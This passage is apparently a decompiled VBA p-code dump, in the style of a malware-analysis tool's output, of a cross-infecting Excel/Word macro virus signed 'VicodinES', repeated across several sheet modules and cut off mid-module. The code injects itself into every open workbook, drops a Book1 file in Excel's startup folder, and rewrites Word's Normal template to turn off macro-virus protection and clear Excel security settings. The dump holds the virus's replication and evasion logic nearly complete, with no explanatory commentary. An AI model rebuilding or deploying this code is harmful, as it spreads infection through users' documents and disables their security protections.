' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet7 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet8 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
